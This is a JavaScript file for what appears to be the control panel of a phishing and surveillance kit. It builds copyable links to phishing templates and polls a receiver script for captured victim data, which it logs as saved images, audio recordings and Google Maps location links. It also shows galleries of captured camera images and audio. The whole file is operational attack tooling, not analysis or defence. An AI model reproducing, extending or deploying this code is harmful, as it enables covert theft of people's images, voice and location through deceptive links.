var old_data = '';
var log_history = [];

function Listener() {
    $.post("receiver.php", { "send_me_result": "" }, function (data) {
        if (data != "") {
            var timestamp = new Date().toLocaleTimeString();
            var logType = 'info';
            var displayData = data;

            if (data.includes("Image")) {
                show_notif("Image File Saved", 'Path : ' + data.slice(26), true);
                logType = 'image';
            } else if (data.includes("Audio")) {
                show_notif("Audio File Saved", 'Path : ' + data.slice(26), false);
                logType = 'image';
            } else if (data.includes("Google Map")) {
                show_notif("Google Map Link", data.slice(18), true);
                logType = 'success';
            }

            var logEntry = `
                <div class="log-entry">
                    <span class="log-time">[${timestamp}]</span>
                    <span class="log-content ${logType}">${displayData}</span>
                </div>
            `;

            $("#log-terminal").append(logEntry);

            var terminal = document.getElementById("log-terminal");
            terminal.scrollTop = terminal.scrollHeight;

            log_history.push(`[${timestamp}] ${data}`);
        }
    });
}

function getFullLogs() {
    return log_history.join("\n");
}

function show_notif(msg, path, status) {
    var btn_text = 'open file';
    var timer = 5000;
    var type_notif = "success";

    if (msg.includes("available")) {
        btn_text = "open link";
        timer = 0;
        type_notif = "danger";
    } else if (msg.includes("Google Map")) {
        btn_text = "open link";
        timer = 0;
    }

    GrowlNotification.notify({
        title: msg,
        description: path,
        type: type_notif,
        closeTimeout: timer,
        showProgress: true,
        showButtons: status,
        buttons: {
            action: {
                text: btn_text,
                callback: function () {
                    window.open(path.replace("Path : ", ""), 'popUpWindow', 'height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');
                }
            },
            cancel: {
                text: 'Cancel',
                callback: function () { }
            }
        },
    });
}

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

function saveTextAsFile(textToWrite, fileNameToSaveAs) {
    var textFileAsBlob = new Blob([textToWrite], { type: 'text/plain' });
    var downloadLink = document.createElement("a");
    downloadLink.download = getRandomInt(10000) + "_" + fileNameToSaveAs;
    if (window.webkitURL != null) {
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    } else {
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }
    downloadLink.click();
}

function check_new_version() {
    return;
}

function loadImages() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/images.php', true);
    xhr.onload = function () {
        try {
            var response = JSON.parse(xhr.responseText);
            var container = document.getElementById('images-gallery');
            if (!container) return;

            if (response.images && response.images.length > 0) {
                var html = '';
                response.images.forEach(function (img) {
                    html += `<div class="image-item" data-url="${img.url}">
                        <img src="${img.url}" alt="${img.name}"/>
                        <div class="image-filename">${img.name}</div>
                        <div class="image-overlay">
                            <button onclick="viewFullImage('${img.url}')"><i class="fas fa-search"></i> View</button>
                            <button onclick="downloadImage('${img.url}', '${img.name}')"><i class="fas fa-download"></i> Download</button>
                        </div>
                    </div>`;
                });
                container.innerHTML = html;
            } else {
                container.innerHTML = `<div class="no-content"><i class="fas fa-camera"></i><p>No images captured yet</p></div>`;
            }
        } catch (e) {
            console.error("Error loading images:", e);
        }
    };
    xhr.send();
}

function loadAudio() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/audio.php', true);
    xhr.onload = function () {
        try {
            var response = JSON.parse(xhr.responseText);
            var container = document.getElementById('audio-list');
            if (!container) return;

            if (response.audio && response.audio.length > 0) {
                var html = '';
                response.audio.forEach(function (audio) {
                    var timestamp = new Date(audio.timestamp * 1000).toLocaleString();
                    html += `<div class="audio-item">
                        <div class="audio-icon"><i class="fas fa-volume-up"></i></div>
                        <div class="audio-info">
                            <div class="audio-filename">${audio.name}</div>
                            <div class="audio-details">${timestamp}</div>
                        </div>
                        <div class="audio-player">
                            <audio controls><source src="${audio.url}" type="audio/wav">Your browser does not support audio.</audio>
                        </div>
                        <div class="audio-controls">
                            <button class="audio-btn" onclick="downloadAudio('${audio.url}', '${audio.name}')"><i class="fas fa-download"></i> Download</button>
                        </div>
                    </div>`;
                });
                container.innerHTML = html;
            } else {
                container.innerHTML = `<div class="no-content"><i class="fas fa-microphone"></i><p>No audio recordings yet</p></div>`;
            }
        } catch (e) {
            console.error("Error loading audio:", e);
        }
    };
    xhr.send();
}

function viewFullImage(url) {
    var width = window.innerWidth * 0.9;
    var height = window.innerHeight * 0.9;
    window.open(url, 'imageViewer', `width=${width},height=${height},resizable=yes,scrollbars=yes`);
}

function downloadImage(url, filename) {
    var link = document.createElement('a');
    link.href = url;
    link.download = filename;
    link.click();
}

function downloadAudio(url, filename) {
    var link = document.createElement('a');
    link.href = url;
    link.download = filename;
    link.click();
}

function clearAllImages() {
    if (confirm('Delete all images?')) {
        alert('Backend deletion not yet implemented');
    }
}

function clearAllAudio() {
    if (confirm('Delete all audio?')) {
        alert('Backend deletion not yet implemented');
    }
}

function loadPhishingTemplates() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/list_templates.php', true);
    xhr.onload = function () {
        try {
            var data = JSON.parse(xhr.responseText);
            var container = document.getElementById('links-container');
            if (!container) return;

            var html = '';
            if (Array.isArray(data) && data.length > 0) {
                data.forEach(function (template) {
                    // Use current protocol (http:// or https://) and host
                    var url = location.protocol + "//" + location.host + "/templates/" + template.trim() + "/index.html";
                    html += `<div class="link-item">
                        <span class="link-url">${url}</span>
                        <button class="btn-copy" onclick="copyToClipboard(this, '${url}')"><i class="fas fa-copy"></i> Copy</button>
                    </div>`;
                });
            } else {
                html = '<p style="color: var(--text-muted); padding: 20px; text-align: center;">No templates available</p>';
            }
            container.innerHTML = html;
        } catch (e) {
            console.error("Error loading templates:", e);
            var container = document.getElementById('links-container');
            if (container) {
                container.innerHTML = '<p style="color: #ef4444; padding: 20px;">Error loading templates</p>';
            }
        }
    };
    xhr.send();
}

function copyToClipboard(btn, url) {
    navigator.clipboard.writeText(url).then(() => {
        var originalText = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i> Copied';
        setTimeout(() => {
            btn.innerHTML = originalText;
        }, 2000);

        if (window.Swal) {
            Swal.fire({
                icon: 'success',
                title: '<span style="color: #10b981; font-weight: 700;">✓ Copied Successfully!</span>',
                html: `<div style="
                    background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(59, 130, 246, 0.1) 100%);
                    padding: 15px;
                    border-radius: 12px;
                    border-left: 4px solid #10b981;
                    margin-top: 10px;
                    font-family: 'Courier Prime', monospace;
                    color: #94a3b8;
                    word-break: break-all;
                    text-align: left;
                    font-size: 0.9rem;
                    line-height: 1.6;
                ">${url}</div>`,
                timer: 2500,
                timerProgressBar: true,
                showConfirmButton: false,
                background: 'linear-gradient(135deg, #1e293b 0%, #0f172a 100%)',
                backdrop: 'rgba(0, 0, 0, 0.8)',
                customClass: {
                    popup: 'premium-popup',
                    title: 'premium-title',
                    htmlContainer: 'premium-content'
                },
                showClass: {
                    popup: 'animate__animated animate__fadeInDown animate__faster'
                },
                hideClass: {
                    popup: 'animate__animated animate__fadeOutUp animate__faster'
                }
            });
        }
    });
}


window.addEventListener('load', function () {
    console.log("Dashboard loading...");

    // Initialize tabs first
    var tabButtons = document.querySelectorAll('.tab-btn');
    console.log("Found " + tabButtons.length + " tab buttons");

    tabButtons.forEach(function (btn) {
        console.log("Setting up tab button for:", btn.getAttribute('data-tab'));
        btn.addEventListener('click', function (e) {
            e.preventDefault();
            var tabName = this.getAttribute('data-tab');
            console.log("Clicked tab:", tabName);

            // Remove active class from all tabs and buttons
            document.querySelectorAll('.tab-content').forEach(function (tab) {
                tab.classList.remove('active');
            });

            document.querySelectorAll('.tab-btn').forEach(function (b) {
                b.classList.remove('active');
            });

            // Add active class to clicked button and corresponding tab
            this.classList.add('active');
            var targetTab = document.getElementById('tab-' + tabName);
            if (targetTab) {
                console.log("Activating tab:", 'tab-' + tabName);
                targetTab.classList.add('active');
            } else {
                console.warn("Tab not found:", 'tab-' + tabName);
            }

            // Load content for specific tabs
            if (tabName === 'images') {
                loadImages();
            } else if (tabName === 'audio') {
                loadAudio();
            }
        });
    });

    setTimeout(function () {
        loadPhishingTemplates();
        console.log("Dashboard initialized successfully!");

        var timer = setInterval(Listener, 2000);
        var isListening = true;

        var btnRefreshImages = document.getElementById('btn-refresh-images');
        if (btnRefreshImages) {
            btnRefreshImages.addEventListener('click', function () {
                var icon = this.querySelector('i');
                if (icon) icon.classList.add('fa-spin');
                loadImages();
                setTimeout(() => {
                    if (icon) icon.classList.remove('fa-spin');
                }, 1000);
            });
        }

        var btnClearImages = document.getElementById('btn-clear-images');
        if (btnClearImages) {
            btnClearImages.addEventListener('click', clearAllImages);
        }

        var btnRefreshAudio = document.getElementById('btn-refresh-audio');
        if (btnRefreshAudio) {
            btnRefreshAudio.addEventListener('click', function () {
                var icon = this.querySelector('i');
                if (icon) icon.classList.add('fa-spin');
                loadAudio();
                setTimeout(() => {
                    if (icon) icon.classList.remove('fa-spin');
                }, 1000);
            });
        }

        var btnClearAudio = document.getElementById('btn-clear-audio');
        if (btnClearAudio) {
            btnClearAudio.addEventListener('click', clearAllAudio);
        }

        var btnListen = document.getElementById('btn-listen');
        if (btnListen) {
            btnListen.addEventListener('click', function () {
                if (isListening) {
                    clearInterval(timer);
                    this.innerHTML = '<i class="fas fa-play"></i> Start Listener';
                    this.classList.remove('btn-danger');
                    this.classList.add('btn-success');
                    isListening = false;
                } else {
                    timer = setInterval(Listener, 2000);
                    this.innerHTML = '<i class="fas fa-stop"></i> Stop Listener';
                    this.classList.remove('btn-success');
                    this.classList.add('btn-danger');
                    isListening = true;
                }
            });
        }

        var btnClear = document.getElementById('btn-clear');
        if (btnClear) {
            btnClear.addEventListener('click', function () {
                var terminal = document.getElementById('log-terminal');
                if (terminal) {
                    terminal.innerHTML = `<div class="log-entry">
                        <span class="log-time">[System]</span>
                        <span class="log-content">Logs cleared. Waiting for interactions...</span>
                    </div>`;
                }
                log_history = [];
            });
        }

        var btnDownload = document.getElementById('btn-download');
        if (btnDownload) {
            btnDownload.addEventListener('click', function () {
                saveTextAsFile(getFullLogs(), 'log.txt');
            });
        }

        console.log("Dashboard initialized successfully!");
    }, 100);
});
